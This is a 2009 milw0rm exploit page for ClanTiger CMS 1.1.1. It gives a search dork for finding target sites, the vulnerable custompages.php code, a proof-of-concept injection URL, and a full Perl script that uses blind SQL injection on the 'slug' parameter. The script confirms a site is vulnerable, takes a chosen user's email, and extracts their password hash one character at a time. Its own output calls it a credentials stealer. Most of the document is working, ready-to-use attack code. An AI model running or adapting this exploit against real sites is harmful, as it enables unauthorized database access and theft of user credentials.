<html><head><title>ClanTiger <= 1.1.1 (slug) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []   []      **
#   [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
#**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
#**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					  ¡PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|       	   	     (custompage.php) BLIND SQL INJECTION		              |
#|--------------------------------------------------------------------------------------------|
#|                         	     | CLAN TIGER CMS |		 			      |
#|  CMS INFORMATION:		      ----------------					      |
#|										              |
#|--&gt;WEB: http://www.clantiger.com				   		              |
#|--&gt;DOWNLOAD: http://www.clantiger.com/download-clan-cms 	   		              |
#|--&gt;DEMO: http://www.demo.clantiger.com/						      |
#|--&gt;CATEGORY: CMS / Portals								      |
#|--&gt;DESCRIPTION: ClanTiger is a content management system specifically designed for gaiming  |
#| 		clans...								      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|--&gt;TESTED ON: firefox 2.0.0.20 and IE 7.0.5730 (Default)				      |
#|--&gt;DORK: &quot;Powered by ClanTiger&quot;							      |
#|--&gt;CATEGORY: BLIND SQL INJECTION/ PERL EXPLOIT					      |
#|--&gt;AFFECT VERSION: LAST = 1.1.1 (1.1 too)						      |
#|--&gt;Discovered Bug date: 2009-04-12							      |
#|--&gt;Reported Bug date: 2009-04-12							      |
#|--&gt;Fixed bug date: Not fixed								      |
#|--&gt;Info patch (????): Not fixed							      |   
#|--&gt;Author: YEnH4ckEr									      |
#|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							      |
#|--&gt;WEB/BLOG: N/A									      |
#|--&gt;COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
#----------------------------------------------------------------------------------------------
#
#-----------
#BUG FILE:
#-----------
#
#Path --&gt; [HOME_PATH]/modules/custompages.php
#
#It contents:
#
#	function main()
#	{
#		
#		...
#
#		$page = new CustomPage();
#		$page-&gt;slug = $_GET['slug'];
#		$page-&gt;getBy(array('slug'));
#		
#		if(!$page-&gt;id)
#		{
#			throw new cccException('The page you are looking for is currently 			unavailable. You may need to STOP! Hammertime. If School Is Out, You 			should try reloading this page.','Page not found');
#		}
#		
#		$tpl-&gt;define('title',$page-&gt;title);
#		$tpl-&gt;define('content',$page-&gt;content); // we allow HTML here, no safeoutput
#		
#		$this-&gt;pageDetails-&gt;setTitle($page-&gt;title);
#		$this-&gt;pageDetails-&gt;addKeyword($page-&gt;keywords);
#		$this-&gt;pageDetails-&gt;setDescription($page-&gt;description);
#		
#		$this-&gt;content = $tpl-&gt;publish();
#		$this-&gt;display();
#	}
#
#------------
#CONDITIONS:
#------------
#
#**DB_PREFIX=&quot;&quot; (Default) 
#
#	maybe: db, db_clan, ...
#
#**Exist a custompage
#
#**gpc_magic_quotes=off
#
#---------------------------------------
#PROOF OF CONCEPT (BLIND SQL INJECTION):
#---------------------------------------
#
#[HOME_PATH]/modules/custompages.php?slug=the_custom_page' [BLIND SQL INJECTION]
#
#---------
#EXAMPLE:
#---------
#
#[HOME_PATH]/modules/custompages.php?slug=the_custom_page'%20AND%20((SELECT%20length(username)%20from%20members%20WHERE%20id=1)=5)%20/*
#
#Result: admin's username has 5 characters (maybe = admin? :P)
#
#*******************************************************************
# ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
#*******************************************************************
#-------------------------------------------------------------------
#*******************************************************************
# GREETZ TO: JosS and all spanish Hack3Rs community!
#*******************************************************************
#
#-------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!
#
use LWP::UserAgent;
use HTML::TreeBuilder 2.96;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = &quot;&quot;;
	if (index(lc($SO),&quot;win&quot;)!=-1){
		$linux=&quot;0&quot;;
	}else{
		$linux=&quot;1&quot;;
	}		
	if($linux){
		system(&quot;clear&quot;);
	}
	else{
		system(&quot;cls&quot;);
		system (&quot;title Clan Tiger CMS (module custompages.php) BLIND SQL Injection Exploit&quot;);
		system (&quot;color 02&quot;);
	}
}
sub request {
	my $cookie=&quot;CCC_LANG=en;&quot;.&quot; CCC_UID=&quot;.$_[0].&quot;; CCC_CODE=&quot;.$_[1].&quot;;&quot;;
	my $userag = LWP::UserAgent-&gt;new;
	$userag -&gt; agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -&gt; new(GET =&gt; $_[2]);
	$request-&gt;header(cookie =&gt; $cookie);
	my $outcode= $userag-&gt;request($request)-&gt;as_string;
	return $outcode;
}
sub helper {
	print &quot;\n\t[**] Clan Tiger CMS - BLIND SQL Injection Exploit\n&quot;;
	print &quot;\t[??] USAGE MODE: [??]\n&quot;;
	print &quot;\t[**] perl $0 [HOST] [PATH] [uid] [code] [slug] [id] [DB_PREFIX]\n&quot;;
	print &quot;\t[**] [HOST]: Web attacked.\n&quot;;
	print &quot;\t[**] [PATH]: Home Path.\n&quot;;
	print &quot;\t[**] [uid]: The CCC_UID cookie.\n&quot;;
	print &quot;\t[**] [code]: The CCC_CODE cookie.\n&quot;;
	print &quot;\t[**] [slug]: Title custompage.\n&quot;;
	print &quot;\t[**] [id]: Exploiting id user. Default: 1 (**optional)\n&quot;;
	print &quot;\t[**] [DB_PREFIX]: Global var needed. Default: null (**optional)\n&quot;;
	print &quot;\t[**] Example: perl $0 www.example.es Clan-tiger-111 f717716... \n&quot;; 
	print &quot;\t[**] ...2e1a50db06c0f2fe8804885ac2c01390 namecustompage 1 \&quot;\&quot;\n&quot;;
}
sub mail{
$output=&amp;request($_[0],$_[1],$_[2]);
 my $root = HTML::TreeBuilder-&gt;new_from_content($output);
# source file
$email= $root-&gt;look_down('_tag','td','style','width: 70%');
print &quot;\t-----------------------------------------------------------------\n&quot;;
print &quot;\tMail captured!.Getting password hash. Wait for a moment...\n&quot;;
print &quot;\t-----------------------------------------------------------------\n&quot;;
return $email -&gt; as_text();
$root-&gt;delete();
}
sub password {
#Second password...
$j=1;
	$i=48;
	while(($j&lt;=32) &amp;&amp; ($i&lt;=126)){
		my $finalrequest=$_[4].&quot;'+AND+ascii(substring((SELECT+password+FROM+&quot;.$_[0].&quot;members+WHERE+id=&quot;.$_[1].&quot;),&quot;.$j.&quot;,1))=&quot;.$i.&quot;+/*&quot;;
		$output=&amp;request($_[2],$_[3],$finalrequest);
		if ( $output =~ (/&lt;title&gt;/.$custompage))
		{
			$pass=$pass.chr($i);
			$j++;
			$i=47;
		}
	if($i==57)
	{
		$i=96;
	}
#new char
	$i++; 
	}
#Error
	if(($i&gt;127) || ($j&gt;32)){
		if(!$pass){
			print &quot;\t-----------------------------------------------------------------\n&quot;;
			print(&quot;\tEXPLOIT FAILED!\n&quot;);
			print(&quot;\tFatal error: Datas doesn't find!\n&quot;);
			print &quot;\t-----------------------------------------------------------------\n&quot;;
			exit(1);
		}
	}
return $pass;
}
#Main
&amp;lw;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t##     Clan Tiger CMS - BLIND SQL Injection Exploit    ##\n\n&quot;;
	print &quot;\t\t##    ++Conditions: Need a register user,a custompage  ##\n\n&quot;;
	print &quot;\t\t##               and DB_PREFIX (default:null)          ##\n\n&quot;;
	print &quot;\t\t##                    Author: Y3nh4ck3r                ##\n\n&quot;;
	print &quot;\t\t##            Contact:y3nh4ck3r[at]gmail[dot]com       ##\n\n&quot;;
	print &quot;\t\t##                    Proud to be Spanish!             ##\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
#Init variables
	my $host=$ARGV[0];
	my $path=$ARGV[1];
	my $uid=$ARGV[2];
	my $code=$ARGV[3];
	my $custompage=$ARGV[4];
#Build the uri
	my $finalhost=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/index.php?module=custompages&amp;slug=&quot;;
	$finalhost=$finalhost.$custompage;
#Check all variables needed
$numArgs = $#ARGV + 1;
	if($numArgs&lt;=4) 
	{
		&amp;helper;
		exit(1);	
	}
#Id-user is optional.Default:1
	if(!$ARGV[5]){
		$idhack=&quot;1&quot;;	
	}else{
		$idhack=$ARGV[5];	
	}
	if(!$ARGV[6]){
		$db_prefix=&quot;&quot;;	
	}else{
		$db_prefix=$ARGV[6];	
	}
#Testing
my $finalrequest = $finalhost;
$output=&amp;request($uid,$code,$finalrequest);
if ( $output =~ /&lt;div class=&quot;title&quot;&gt;Access denied&lt;\/div&gt;/)
{
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tYour credentials are not correct! This exploits need login.\n&quot;;
	print &quot;\tOptions: [your-id-user],[your-password] incorrect.\n&quot;; 
	print &quot;\tExploit failed! No luck!\n&quot;;
	print &quot;\t-----------------------------------------------------------------\n&quot;;
    exit(1);
}
if ( $output =~ /&lt;div class=&quot;title&quot;&gt;Page not found&lt;\/div&gt;/)
{
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tCustom page doesn't exist! Maybe no there on this server!\n&quot;;
	print &quot;\tOption: [slug-get-var] incorrect.\n&quot;; 
	print &quot;\tExploit failed! No luck!\n&quot;;
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	exit(1);
}
if ( $output =~ (/&lt;title&gt;/.$custompage))
{
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tThis Web could be vulnerable!\n&quot;;
	print &quot;\tThe custompage exists!\n&quot;;
	print &quot;\tTesting Blind SQL Injection...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
}else{ 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tCustompage doesn't exist!\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t-----------------------------------------------------------------\n&quot;;
exit(1); 
}	
#Test blind sql injection
my $finalrequest=$finalhost.&quot;'+AND+1=1+/*&quot;;
$output=&amp;request($uid,$code,$finalrequest);
if ( $output =~ (/&lt;title&gt;/.$custompage))
{    
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tThis Web is really vulnerable!\n&quot;;
	print &quot;\tTested Blind SQL Injection.\n&quot;;		
	print &quot;\tChecking id user and DB_PREFIX null...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
}else{ 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tThis Web is not vulnerable (Maybe patched)!\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t-----------------------------------------------------------------\n&quot;;
exit(1); 
}	
#Test if user exists and DB_PREFIX
my $finalrequest=$finalhost.&quot;'+AND+(SELECT+COUNT(*)+from+&quot;.$db_prefix.&quot;members+WHERE+id=&quot;.$idhack.&quot;)+/*&quot;;
$output=&amp;request($uid,$code,$finalrequest);
if ( $output =~ (/&lt;title&gt;/.$custompage))
{    
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tOK...The user exists and DB_PREFIX is '&quot;.$db_prefix.&quot;'!\n&quot;;		
	print &quot;\tStarting exploit...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tWait several minutes...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
}else{ 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tUser doesn't exists or DB_PREFIX not '&quot;.$db_prefix.&quot;'\n&quot;;		
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t-----------------------------------------------------------------\n&quot;;
exit(1); }	
#OK, now we get the mail user from web 
#i got it from blind sql but this method is faster and reduce time of injection
#First email...
my $hostmail=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/index.php?module=profiles&amp;action=view&amp;id=&quot;.$idhack;
$mail=&amp;mail($uid,$code,$hostmail);
$passhash=&amp;password($db_prefix,$idhack,$uid,$code,$finalhost);
print &quot;\n\t\t*************************************************\n&quot;;
print &quot;\t\t****  EXPLOIT EXECUTED (CREDENTIALS STEALER) ****\n&quot;;
print &quot;\t\t*************************************************\n\n&quot;;
print &quot;\t\tUser-id:&quot;.$idhack.&quot;\n&quot;;
print &quot;\t\tUser-email:&quot;.$mail.&quot;\n&quot;;
print &quot;\t\tUser-password(hash):&quot;.$passhash.&quot;\n\n&quot;;
print &quot;\n\t\t----------------------FINISH!--------------------\n\n&quot;;
print &quot;\t\t---------------Thanks to: y3hn4ck3r--------------\n\n&quot;;
print &quot;\t\t------------------------EOF----------------------\n\n&quot;;
exit(1);
#Ok...all job done

# milw0rm.com [2009-04-17]</pre></html>